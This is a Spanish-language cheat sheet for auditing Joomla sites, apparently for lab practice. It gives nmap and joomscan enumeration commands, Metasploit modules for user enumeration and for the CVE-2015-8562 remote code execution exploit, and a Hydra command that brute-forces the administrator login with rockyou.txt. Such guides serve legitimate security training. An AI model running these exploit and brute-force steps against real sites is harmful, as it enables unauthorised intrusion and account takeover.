# Joomla - CMS.

## **🔍 Identificación de la versión de Joomla y sus componentes.**

```bash
nmap -sV --script http-joomla-enum <url> # Detección de versión de Joomla y extensiones.
nmap -sV --script "http-joomla* and not http-joomla-brute" <url> # Escaneo de vulnerabilidades en Joomla.
nmap -sV --script http-joomla-users <url> # Detección de usuarios de Joomla.
nmap --script=http-joomla-enum --script-args http-joomla-enum.root=/ -p 80,443 <URL> # Escaneo completo para confirmar si se está utilizando Joomla.
nmap --script=http-vuln* -p 80,443 <url> # Detectar vulnerabilidades específicas en Joomla y sus extensiones.
```

> 💡 Si el servicio web no carga correctamente o parece inaccesible, podría haber virtual hosting. En ese caso, debemos agregar el dominio correspondiente en nuestro **/etc/hosts**, por ejemplo: `10.0.0.10 joomla.htb`.

## **🔍 Escaneo básico Joomla con Metasploit.**

```bash
use auxiliary/scanner/http/joomla_version # Cargar módulo que vamos a utilizar.
set RHOSTS <url>
set RPORT 80
set TARGETURI /
run
```

## **🔍 Enumerar Usuarios de Joomla**

```bash
use auxiliary/scanner/http/joomla_users_enum # Cargar módulo que vamos a utilizar.
set RHOSTS <url>
set RPORT 80
set TARGETURI /
run
```

## **🔑 Ataque de fuerza bruta con Metasploit:**

```bash
set RHOSTS <url>
set USERNAME <nombre_usuario> # Nombre de usuario objetivo.
set PASS_FILE /usr/share/wordlists/rockyou.txt # Diccionario de contraseñas.
run
```

## **🛠️ Ejecución del exploit Joomla CVE-2015-8562 con Metasploit.**

> 💡El exploit CVE-2015-8562 permite la ejecución remota de código en versiones vulnerables de Joomla. Y afecta a versiones de **Joomla 1.5 a 3.4.5**.

```bash
use exploit/multi/http/joomla_http_header_rce # Seleccionamos el exploit.
set RHOSTS <url> # URL del objetivo.
set RPORT 80
set TARGETURI /
run # Iniciamos el ataque.
```

## **🛠️ Otras herramientas para auditar Joomla.**

### **🔹 Joomscan**

**Joomscan** es una herramienta especializada en la enumeración y auditoría de sitios web basados en **Joomla**.

```bash
joomscan --url <url_joomla> # Análisis básico del sitio Joomla.
joomscan --url <url_joomla> --enumerate-extensions # Enumerar extensiones instaladas.
joomscan --url <url_joomla> --enumerate-users # Enumerar usuarios.
```

> 💡 Una buena práctica al auditar Joomla es revisar el código fuente de la página web. Ahí podremos encontrar información sobre plantillas, extensiones utilizadas y posibles rutas sensibles.

Si encontramos posibles nombres de usuario durante la auditoría, debemos guardarlos en un archivo **.txt** para utilizarlos como **wordlist** de usuarios.

### **🔑 Fuerza bruta al panel Login de Joomla.**

**Fuerza bruta con Hydra**

```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <url> http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login:F=Incorrect username or password."
```

🏁 Con esta guía hemos cubierto los pasos necesarios para detectar la versión de Joomla, encontrar extensiones, directorios sensibles, buscar paneles de login y realizar fuerza bruta para intentar obtener acceso.

> 💡 _Más adelante, en la parte de Fuzzing Web y descubrimiento de directorios y subdominios, veremos cómo encontrar posibles rutas sensibles que nos faciliten la obtención de información._
